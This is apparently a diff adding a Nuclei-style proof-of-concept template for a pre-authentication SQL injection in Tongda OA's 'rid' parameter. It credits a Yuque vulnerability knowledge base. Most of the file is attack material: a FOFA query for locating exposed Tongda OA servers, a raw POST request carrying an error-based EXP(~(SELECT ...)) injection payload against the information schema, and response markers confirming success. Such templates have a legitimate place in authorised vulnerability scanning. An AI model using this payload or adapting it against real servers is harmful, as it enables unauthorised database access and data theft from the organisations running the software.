@@ -1,0 +1,60 @@
+id: poc-hg8evab8bkob2zu2
+info:
+  name: 通达OA rid前台SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hg8evab8bkob2zu2'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hg8evab8bkob2zu2
+    fofa: title="office Anywhere" && icon_hash="-759108386" && "2013"
+http:
+- raw:
+  - 'POST /general/document/index.php/recv/register/turn HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Connection: close
+
+
+    Cookie: PHPSESSID=1ef6b0ee413048f9f7b2d4b78cd00598
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    _SERVER=&rid=EXP(~(SELECT*FROM(SELECT md5(1) FROM INFORMATION_SCHEMA.tables where table_schema=0x74645F6F61 LIMIT 1,1)a))
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    c4ca4238a0b9238
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
